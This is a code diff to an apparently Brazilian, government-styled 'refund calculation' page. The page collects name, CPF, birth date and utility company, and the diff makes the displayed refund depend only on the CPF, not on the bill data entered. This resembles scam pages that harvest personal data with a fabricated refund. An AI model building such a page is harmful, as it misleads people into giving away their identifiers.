@@ -26,10 +26,13 @@ export default function ResultadoCalculo() {
   
   // Obter dados do usuário do contexto global
   const nome = userData.nome || "";
-  const cpf = userData.cpf || "";
+  const cpf = userData.cpf || "";  // O CPF é a única fonte para determinar o valor da restituição
   const companhia = userData.companhia || "";
   const estado = userData.estado || "";
   const dataNascimento = userData.dataNascimento || "";
+  
+  // IMPORTANTE: Esses valores não afetam o cálculo da restituição
+  // A restituição é determinada apenas pelo CPF e sempre será a mesma para um mesmo CPF
   const valorMedio = userData.valorConta?.toString() || "";
   const meses = userData.periodo?.toString() || "";
   
@@ -363,11 +366,10 @@ export default function ResultadoCalculo() {
                       </span>
                     </div>
                     
-                    {meses && (
-                      <p className="text-xs text-[var(--gov-gray-dark)] mt-2 text-center">
-                        Valor calculado com base em <span className="font-semibold">{meses} meses</span> de cobranças indevidas
-                      </p>
-                    )}
+                    {/* Texto explicativo sobre o valor da restituição - independente dos dados informados */}
+                    <p className="text-xs text-[var(--gov-gray-dark)] mt-2 text-center">
+                      Valor único de restituição atrelado ao seu CPF. <span className="font-semibold">Este valor é fixo</span> e não varia com os dados informados.
+                    </p>
                   </div>
                 </div>
                 
